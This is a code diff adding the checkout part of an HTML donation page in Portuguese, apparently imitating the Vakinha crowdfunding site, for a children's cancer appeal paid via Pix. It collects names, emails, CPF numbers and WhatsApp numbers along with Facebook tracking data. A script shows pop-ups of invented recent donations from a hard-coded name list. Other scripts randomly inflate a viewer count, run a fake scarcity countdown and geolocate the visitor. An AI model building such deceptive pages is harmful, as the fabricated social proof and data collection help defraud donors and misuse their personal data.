+                <div class="extras-desc">Você ajuda crianças no tratamento do câncer infantil a terem acolhimento e experiências mágicas</div>
+              </div>
+              <div class="extras-price">R$ 58,90</div>
+            </div>
+          </div>
+          <div class="checkout-extras-row" style="margin-top:8px;">
+            <span class="checkout-extras-label" style="background:#00c853;color:#fff;padding:6px 10px;border-radius:10px;">TURBINE SUA DOAÇÃO</span>
+            <span id="extras-total" class="checkout-extras-total"></span>
+          </div>
+        </div>
+        <div class="checkout-summary">
+          Contribuição: <span id="contrib-summary">R$ 0,00</span>
+        </div>
+        <div class="checkout-total-row">
+          Total: <span id="contrib-total">R$ 0,00</span>
+        </div>
+        <div class="checkout-checkbox-row">
+          <input type="checkbox" id="updates">
+          <label for="updates">Quero receber atualizações desta vaquinha e de outras iniciativas.</label>
+        </div>
+        <button type="submit" class="checkout-btn">CONTRIBUIR</button>
+        <div class="checkout-security">
+          <img src="images/selo.png" alt="Selo de segurança" class="security-img">
+          <span class="security-label">Garantimos uma experiência segura para todos os nossos doadores.</span>
+        </div>
+        <div class="checkout-terms">
+          Ao clicar no botão acima você declara que é maior de 18 anos e concorda com os Termos.
+        </div>
+      </form>
+      <!-- SCRIPT UTM (RESTAURADO MINIMAL) -->
+      <script>
+      (function(){
+        function getCookie(name){
+          var m = document.cookie.match(new RegExp('(^|; )'+name+'=([^;]*)'));
+          return m ? decodeURIComponent(m[2]) : null;
+        }
+        function setCookie(name,value,days){
+          var d=new Date();d.setTime(d.getTime()+((days||365)*24*60*60*1000));
+          document.cookie = name + "=" + encodeURIComponent(value) + ";path=/;expires=" + d.toUTCString();
+        }
+
+        var params = new URLSearchParams(location.search);
+        var keys = ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','fbclid','fbc','fbp'];
+        var data = {};
+        keys.forEach(function(k){ if(params.has(k)) data[k] = params.get(k); });
+
+        // Ler cookies Facebook existentes
+        var fbp = getCookie('_fbp') || data['fbp'] || null;
+        var fbc = getCookie('_fbc') || data['fbc'] || null;
+
+        // Se não existir _fbc mas houver fbclid, sintetiza um _fbc padrão e persiste
+        if(!fbc && params.has('fbclid')){
+          fbc = 'fb.1.' + Math.floor(Date.now()/1000) + '.' + params.get('fbclid');
+          setCookie('_fbc', fbc, 365);
+        }
+
+        if(fbp) data['fbp'] = fbp;
+        if(fbc) data['fbc'] = fbc;
+
+        try{ localStorage.setItem('vakinha_utms', JSON.stringify(data)); }catch(e){}
+        var el=document.getElementById('utms'); if(el) el.value = JSON.stringify(data);
+      })();
+      </script>
+      <script>
+        // Exibe overlay de loading ao enviar o formulário
+        (function(){
+          var form = document.querySelector('form');
+          var overlay = document.getElementById('pix-loading-overlay');
+          if(form && overlay){
+            form.addEventListener('submit', function(ev){
+              var input = document.getElementById('contrib-value');
+              var err = document.getElementById('value-error');
+              // Só mostra loading se não houver erro de valor
+              var base = input ? parseFloat(input.value.replace(',','.')) : 0;
+              if (!err || err.style.display === 'none') {
+                overlay.style.display = 'flex';
+              }
+            });
+          }
+        })();
+      </script>
+    </div> <!-- /.checkout-inner -->
+  </div> <!-- /.checkout-wrapper -->
+    <script>
+  (function(){
+    try {
+      var stored = localStorage.getItem('vakinha_utms');
+      function getCookie(name){
+        var m = document.cookie.match(new RegExp('(^|; )'+name+'=([^;]*)'));
+        return m ? decodeURIComponent(m[2]) : null;
+      }
+      var obj = {};
+      if (stored) {
+        obj = JSON.parse(stored);
+      } else {
+        var params = new URLSearchParams(window.location.search);
+        var keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid','fbc','fbp'];
+        keys.forEach(function(k){ if (params.has(k)) obj[k] = params.get(k); });
+      }
+      // garantir leitura de cookies _fbp/_fbc
+      var fbp = getCookie('_fbp');
+      var fbc = getCookie('_fbc');
+      if (!obj.fbp && fbp) obj.fbp = fbp;
+      if (!obj.fbc && fbc) obj.fbc = fbc;
+      if (Object.keys(obj).length) {
+        document.getElementById('utms').value = JSON.stringify(obj);
+        try { localStorage.setItem('vakinha_utms', JSON.stringify(obj)); }catch(e){}
+      }
+    } catch(e){}
+  })();
+  </script>
+  <script>
+    // ===== Script do campo de valor (ATUALIZADO) =====
+    (function(){
+      var input = document.getElementById('contrib-value');
+      var err = document.getElementById('value-error');
+      var summary = document.getElementById('contrib-summary');
+      var total = document.getElementById('contrib-total');
+      var extrasTotalSpan = document.getElementById('extras-total');
+
+      var minAmount = 30;
+      var maxAmount = 1000;
+
+      function parseBRL(str){
+        if(!str) return 0;
+        str = str.replace(/[^\d,]/g,'').replace(/\./g,'')
+        if(str.indexOf(',') === -1) str = str + ',00';
+        var parts = str.split(',');
+        var ints = parts[0].replace(/^0+(?=\d)/,'') || '0';
+        var dec = (parts[1] || '00').slice(0,2);
+        var num = parseFloat(ints + '.' + dec);
+        return isNaN(num)?0:num;
+      }
+      function formatBRL(n){
+        n = (Math.round(n*100)/100).toFixed(2).replace('.',',');
+
+        var parts = n.split(',');
+        parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g,'.');
+        return 'R$ '+parts.join(',');
+      }
+      function inRange(v){ return v >= minAmount && v <= maxAmount; }
+
+      function sumExtras(){
+        var extras = 0;
+        var chks = document.querySelectorAll('.extra-checkbox');
+        chks.forEach(function(c){
+          if(c.checked){
+            var a = parseFloat(c.getAttribute('data-amount')) || 0;
+            extras += a;
+          }
+        });
+        return extras;
+      }
+
+      function update(){
+        var base = parseBRL(input.value);
+        var ext = sumExtras();
+        summary && (summary.textContent = formatBRL(base));
+        total && (total.textContent = formatBRL(base + ext));
+        if (extrasTotalSpan){
+          extrasTotalSpan.textContent = ext ? '+' + formatBRL(ext) : '';
+        }
+        if(!inRange(base)){
+          err.style.display='block';
+          input.classList.add('input-error');
+        } else {
+          err.style.display='none';
+          input.classList.remove('input-error');
+        }
+        // destaque visual das cards selecionadas
+        document.querySelectorAll('.checkout-extras-item').forEach(function(item){
+          var chk = item.querySelector('.extra-checkbox');
+          if (chk && chk.checked) {
+            item.style.boxShadow = '0 6px 18px rgba(0,200,83,0.08)';
+            item.style.border = '1px solid #cfefd9';
+          } else {
+            item.style.boxShadow = '0 1px 4px rgba(0,0,0,0.04)';
+            item.style.border = 'none';
+          }
+        });
+      }
+
+      input && input.addEventListener('input', function(){
+        var raw = this.value.replace(/[^\d,]/g,'')
+        var c = raw.indexOf(',');
+        if(c !== -1){
+          raw = raw.slice(0,c+1)+raw.slice(c+1).replace(/,/g,'')
+        }
+        this.value = raw;
+        update();
+      });
+      input && input.addEventListener('blur', function(){
+        var v = parseBRL(this.value);
+        this.value = formatBRL(v).replace('R$ ','')
+        update();
+      });
+
+      document.querySelectorAll('.extra-checkbox').forEach(function(chk){
+        chk.addEventListener('change', update);
+      });
+
+      var form = document.querySelector('form');
+      if(form){
+        form.addEventListener('submit', function(ev){
+          var base = parseBRL(input.value);
+          if(!inRange(base)){
+            ev.preventDefault();
+            err.style.display='block';
+            input.classList.add('input-error');
+            input.focus();
+          } else {
+            // envia base em formato 0,00
+            input.value = base.toFixed(2).replace('.',',');
+
+          }
+        });
+      }
+      update();
+    })();
+  </script>
+
+  <!-- === TOAST DE COMPRAS (widget) === -->
+  <div class="elementor-widget-container">
+    <style>
+      :root { --cor-de-destaque: #f00; }
+      #views b, #vagas b { color: var(--cor-de-destaque); }
+      #vagas{ display: none; }
+      #views { max-width: 800px; margin: auto; line-height: 1.4; }
+      #toast-compras {
+        position: fixed; right: 20px; bottom: 20px; z-index: 1000;
+        background-color: #FFF; padding: 10px 20px; display: flex; align-items: center; justify-content: center; gap: 20px;
+        border-radius: 5px; box-shadow: 1px 1px 5px #00000036;
+        transform: translateY(calc(100% + 40px)); transition: all .3s ease; opacity: 0
+      }
+      #toast-compras.show { transform: none; opacity: 1 }
+      #toast-compras * { font-family: "Roboto", sans-serif }
+      #toast-compras svg { width: 40px; height: 40px; fill: #11F849; border: 3px solid #11F849; padding: 5px; border-radius: 100px }
+      #toast-compras .textos .linha-1 { display: flex; gap: 20px; align-items: center; margin: 0 0 5px }
+      #toast-compras .textos .linha-1 .nome { font-size: 16px; font-weight: 500; line-height: 16px; color: #1b1b1b; margin: 0 }
+      #toast-compras .textos .linha-1 .tempo { font-size: 14px; font-weight: 400; line-height: 14px; color: #7a7a7a; margin: 0 }
+      #toast-compras .textos .pagamento { font-size: 16px; line-height: 1; color: #7a7a7a; margin: 0 }
+    </style>
+    <div id="toast-compras" class="">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 96.01 447.98 319.97">
+        <path d="M438.6 105.4C451.1 117.9 451.1 138.1 438.6 150.6L182.6 406.6C170.1 419.1 149.9 419.1 137.4 406.6L9.372 278.6C-3.124 266.1-3.124 245.9 9.372 233.4C21.87 220.9 42.13 220.9 54.63 233.4L159.1 338.7L393.4 105.4C405.9 92.88 426.1 92.88 438.6 105.4H438.6z"></path>
+      </svg>
+      <div class="textos">
+        <div class="linha-1">
+          <p class="nome">Raquel Silveira</p>
+          <p class="tempo">há 22 minutos</p>
+        </div>
+        <p class="pagamento">Doou no pix</p>
+      </div>
+    </div>
+    <script>
+      const delayEmSegundosVagas = 1;
+      const delayEmSegundosCompras = 1;
+      const manterVagasVisiveis = false;
+      const compras = [
+        { nome: "Vanessa R.", tempo: "45 minutos", pagamento: "pix" },
+        { nome: "Raquel Silveira", tempo: "22 minutos", pagamento: "pix" },
+        { nome: "Roberta Cavalcante", tempo: "32 minutos", pagamento: "pix" },
+        { nome: "Ana R.", tempo: "12 minutos", pagamento: "Pix" },
+        { nome: "Marcela F.", tempo: "51 minutos", pagamento: "cartão de débito" },
+        { nome: "Juliana D.", tempo: "37 minutos", pagamento: "pix" }
+      ];
+      setTimeout(() => { configurarVagas(); }, delayEmSegundosVagas * 1000)
+      setTimeout(() => { mostrarToast(); }, delayEmSegundosCompras * 1000)
+      document.addEventListener('DOMContentLoaded', function(){
+        inserirData();
+        configurarViews();
+        if(manterVagasVisiveis) exibirVagas();
+      });
+      function inserirLocalizacao() {
+        fetch("https://wtfismyip.com/json").then(res => res.json().then((data) => {
+          const cidade = data.YourFuckingLocation.split(',')[0];
+          document.querySelector('span#address').innerHTML = `de <b>${cidade}</b>`;
+        }))
+      }
+      function exibirVagas(){ document.querySelector('#vagas').style.display = "block"; }
+      function configurarVagas() {
+        exibirVagas();
+        const vagasInterval = setInterval(() => {
+          const vagasElement = document.querySelector('#vagas b')
+          const vagas = Number(vagasElement.innerText);
+          if(vagas >= 100) {
+            vagasElement.innerText = vagas - randomNumber(3, 8);
+          } else if(vagas >= 30) {
+            vagasElement.innerText = vagas - randomNumber(1, 3);
+          } else if(vagas >= 4) {
+            vagasElement.innerText = vagas - 1;
+          } else {
+            clearInterval(vagasInterval);
+          }
+        }, randomNumber(4, 8) * 1000);
+      }
+      function configurarViews() {
+        const viewsInterval = setInterval(() => {
+          const viewsElement = document.querySelector('#views b.qtd');
+          const views = Number(viewsElement.innerText);
+          if(views <= 500) {
+            viewsElement.innerText = views + randomNumber(3, 8);
+          } else if(views >= 2300) {
+            viewsElement.innerText = views + randomNumber(-5, 5);
+          } else {
+           
+            viewsElement.innerText = views + randomNumber(-3, 12);
+          }
+        }, 5 * 1000);
+      }
+      function mostrarToast() {
+        configurarToast()
+        document.querySelector('#toast-compras').classList.add('show');
+        setTimeout(() => {
+          document.querySelector('#toast-compras').classList.remove('show');
+          setTimeout(() => { mostrarToast(); }, randomNumber(5, 10) * 1000)
+        }, 2500);
+      }
+      function configurarToast() {
+        document.querySelector('#toast-compras .nome').innerText = compras[0].nome;
+        document.querySelector('#toast-compras .tempo').innerText = `há ${compras[0].tempo}`;
+        document.querySelector('#toast-compras .pagamento').innerText = `Doou no ${compras[0].pagamento}`;
+        compras.push(compras.shift());
+      }
+      function randomNumber(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+      }
+      function inserirData() {
+        const data = new Date().toLocaleDateString();
+        const el = document.querySelector('#views b.date');
+        if (el) el.innerText = data;
+      }
+    </script>
+  </div>
+
+  <script>
+document.getElementById('checkoutForm').addEventListener('submit', async function(ev) {
+    ev.preventDefault();
+    
+    const overlay = document.getElementById('pix-loading-overlay');
+    overlay.style.display = 'flex';
+
+    // Captura os dados
+    const data = {
+        personalData: {
+            nome: document.querySelector('input[name="nome"]').value || "Doador Anônimo",
+            email: document.querySelector('input[name="email"]').value || "email@exemplo.com",
+            cpf: document.querySelector('input[name="cpf"]').value || "",
+            whatsapp: document.querySelector('input[name="whatsapp"]').value || ""
+        },
+        amountBase: document.getElementById('contrib-value').value,
+        extras: {
+            luck: document.getElementById('extra-luck').checked,
+            heart: document.getElementById('extra-heart').checked,
+            cause: document.getElementById('extra-cause').checked
+        },
+        utms: JSON.parse(localStorage.getItem('vakinha_utms') || '{}')
+    };
+
+    try {
+        // Envia para sua API em api/checkout.js
+        const response = await fetch('/api/checkout', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+            // Esconde o formulário e exibe o PIX
+            document.querySelector('.checkout-section').parentElement.innerHTML = `
+                <div class="pix-payment-wrapper" style="margin-top:0;">
+                    <div class="pix-card pix-left">
+                        <span class="qr-badge">AGUARDANDO PAGAMENTO</span>
+                        <img src="${result.qrcode}" class="qr-img" style="width:100%; height:auto;">
+                        <div class="pix-copia-mobile">
+                            <label>Copia e Cola</label>
+                            <div class="code-row">
+                                <input type="text" value="${result.copyPaste}" id="pix-copy-input" readonly>
+                                <button type="button" id="pix-copy-btn" onclick="copyPixCode()">COPIAR</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="pix-right">
+                        <h2 class="pix-title">Escaneie o QR Code</h2>
+                        <p>Acesse seu banco e escolha "Pagar via Pix".</p>
+                        <div class="pix-info-grid">
+                            <div><span>VALOR TOTAL</span><strong>R$ ${(result.totalAmount / 100).toFixed(2).replace('.',',')}</strong></div>
+                            <div><span>ID</span><strong>${result.orderId}</strong></div>
+                        </div>
+                        <div class="pix-copia-cola" style="margin-top:20px;">
+                            <label>PIX COPIA E COLA</label>
+                            <div class="code-row">
+                                <input type="text" value="${result.copyPaste}" readonly>
+                                <button type="button" onclick="copyPixCode()">COPIAR</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>`;
+        } else {
+            alert("Erro ao gerar Pix: " + (result.error || "Verifique os dados"));
+        }
+    } catch (err) {
+        console.error(err);
+        alert("Erro de conexão com o servidor.");
+    } finally {
+        overlay.style.display = 'none';
+    }
+});
+</script>
+
+
+</body></html>
